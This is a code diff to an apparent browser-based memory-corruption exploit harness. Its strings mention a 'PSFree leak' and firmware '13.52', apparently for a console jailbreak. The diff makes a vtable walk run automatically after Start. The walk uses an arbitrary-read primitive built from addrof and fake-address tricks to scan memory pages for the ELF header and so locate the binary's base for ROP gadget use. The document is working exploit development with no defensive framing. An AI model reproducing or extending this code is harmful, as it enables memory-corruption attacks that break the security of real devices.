@@ -26,6 +26,11 @@ const ASSUMED_EXPM1 = parseInt(
 );
 const BAD_READ_MAGICS = new Set([0, 0xffffffff, 0xcccccccc, 0xcdcdcdcd, 0xdeadbeef]);
 const FIND_BASE_MAX_STEPS = parseInt(params.get("backmax") || "2048", 10);
+/** 0 = run full vtable walk as fast as possible; yield to UI every N steps */
+const WALK_YIELD_EVERY = parseInt(params.get("walkyield") || "512", 10);
+const WALK_LOG_EVERY = parseInt(params.get("walklog") || "128", 10);
+/** auto vtable walk after Start unless ?vtable=0 */
+const AUTO_VTABLE_WALK = params.get("vtable") !== "0";
 const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|CAL-|GADGET|ELF|BASES|LK-|PASTE|HINT-GROOM/i;
 
 const GADGET_CHECKS = [
@@ -772,15 +777,21 @@ async function runStart() {
             return;
         }
 
-        mark("HINT-CAL", "best base leak: tap 2e Find base (vtable) — no expm1 needed");
+        mark("HINT-CAL", "vtable base walk runs automatically after Start");
         prefillSuggestedExpm1(nativeFn, tableOff);
 
         const pre = parseExpm1(params.get("expm1"));
         if (pre > 0 && expm1In) expm1In.value = pre.toString(16);
 
         updateResultPanel();
-        mark("NEXT", "tap 2e Find base (vtable) OR Assume expm1 (test)");
-        state("primitive OK — 2e vtable or Assume", "ok");
+
+        if (AUTO_VTABLE_WALK && !manualBase) {
+            mark("AUTO", "2e vtable walk starting…");
+            await walkVtableForBase();
+        } else {
+            mark("NEXT", "tap 2e to re-run vtable walk OR Verify step");
+            state("primitive OK — vtable walk skipped", "ok");
+        }
         try { if (expm1In) expm1In.focus(); } catch (_) { }
         if (calBarEl && calBarEl.scrollIntoView)
             try { calBarEl.scrollIntoView(false); } catch (_) { }
@@ -936,62 +947,60 @@ function runAssumeTest(fromStart) {
     setUi();
 }
 
+async function walkVtableForBase() {
+    const p = window.p;
+    const startPtr = ensureVtablePtr(p);
+    if (!startPtr) {
+        state("vtable leak failed", "bad");
+        return false;
+    }
+
+    try { sessionStorage.removeItem(SS_VTABLE_FIND_I); } catch (_) { }
+
+    mark("VTABLE-WALK", "auto walk from " + startPtr + " (max " + FIND_BASE_MAX_STEPS + " pages)");
+    state("vtable walk 0/" + FIND_BASE_MAX_STEPS + "…", "warn");
+
+    for (let step = 0; step < FIND_BASE_MAX_STEPS; step++) {
+        const base = findBaseWalkAddr(startPtr, step);
+        if (!base) {
+            mark("CAL-FAIL", "vtable walk past valid range @ step " + step);
+            state("vtable walk stopped", "bad");
+            return false;
+        }
+
+        const magic = read4p(p, base);
+        const n = step + 1;
+        if (n === 1 || n % WALK_LOG_EVERY === 0 || magic === ELF_MAGIC) {
+            mark("VTABLE-FIND", n + "/" + FIND_BASE_MAX_STEPS
+                + " base=" + base + " got=" + fmtMagic(magic));
+        }
+        if (n % 32 === 0 || n === 1)
+            state("vtable walk " + n + "/" + FIND_BASE_MAX_STEPS + "…", "warn");
+
+        if (magic === ELF_MAGIC) {
+            applyBaseFound(base, "vtable-walk");
+            mark("NEXT", "Verify step to confirm gadgets (base from vtable, not expm1)");
+            state("ELF found via vtable walk", "ok");
+            return true;
+        }
+
+        if (WALK_YIELD_EVERY > 0 && n % WALK_YIELD_EVERY === 0)
+            await new Promise(r => setTimeout(r, 0));
+    }
+
+    mark("CAL-FAIL", "vtable walk exhausted " + FIND_BASE_MAX_STEPS + " pages — no ELF");
+    mark("HINT", "check VTABLE-OK line — try ?backmax=4096 or ?vtable=0 and manual base");
+    state("vtable walk — no ELF", "bad");
+    return false;
+}
+
 async function runFindBaseVtable() {
     if (busy || !ready || !window.p || !carrierRef) return;
     busy = true;
     setUi();
     preCalTrim();
-
-    const p = window.p;
-    const startPtr = ensureVtablePtr(p);
-    if (!startPtr) {
-        state("vtable leak failed", "bad");
-        busy = false;
-        setUi();
-        return;
-    }
-
-    let step = 0;
-    try { step = parseInt(sessionStorage.getItem(SS_VTABLE_FIND_I) || "0", 10) || 0; } catch (_) { }
-
-    if (step >= FIND_BASE_MAX_STEPS) {
-        mark("CAL-FAIL", "vtable find-base exhausted " + FIND_BASE_MAX_STEPS + " pages back");
-        mark("HINT", "check VTABLE-OK line — vtable may be wrong impl offset");
-        state("vtable walk done — no ELF", "bad");
-        busy = false;
-        setUi();
-        return;
-    }
-
-    const base = findBaseWalkAddr(startPtr, step);
-    if (!base) {
-        mark("CAL-FAIL", "vtable walk past valid range");
-        state("vtable walk stopped", "bad");
-        busy = false;
-        setUi();
-        return;
-    }
-
-    mark("VTABLE-FIND", (step + 1) + "/" + FIND_BASE_MAX_STEPS
-        + " vtable=" + startPtr + " base=" + base + " (1 read)");
-
     try {
-        await new Promise(r => setTimeout(r, 64));
-        const magic = read4p(p, base);
-        step++;
-        try { sessionStorage.setItem(SS_VTABLE_FIND_I, String(step)); } catch (_) { }
-
-        if (magic !== ELF_MAGIC) {
-            const tag = isBadRead(magic) ? " (bad/unmapped)" : "";
-            mark("ELF-MISS", fmtMagic(magic) + " @ " + base + tag);
-            mark("HINT", "keep tapping 2e Find base (vtable)");
-            state("vtable walk " + step + "/" + FIND_BASE_MAX_STEPS + " — tap again", "warn");
-            return;
-        }
-
-        applyBaseFound(base, "vtable-walk");
-        mark("NEXT", "Verify step to confirm gadgets (base is from vtable, not expm1)");
-        state("ELF found via vtable walk", "ok");
+        await walkVtableForBase();
     } finally {
         busy = false;
         setUi();
@@ -1377,8 +1386,7 @@ function init() {
 
     mark("BOOT", "index_cal.html — expm1 finder for 13.52");
     mark("BOOT", groomBootLine());
-    mark("BOOT", "2e Find base (vtable) = PSFree leak — best path, no expm1");
-    mark("BOOT", "2d Find base walks back from nativeFn until ELF");
+    mark("BOOT", "2e vtable walk auto after Start (?vtable=0 to disable)");
     wireGroomBar();
     setUi();
     state("ready — pick groom if needed, then Start", "");
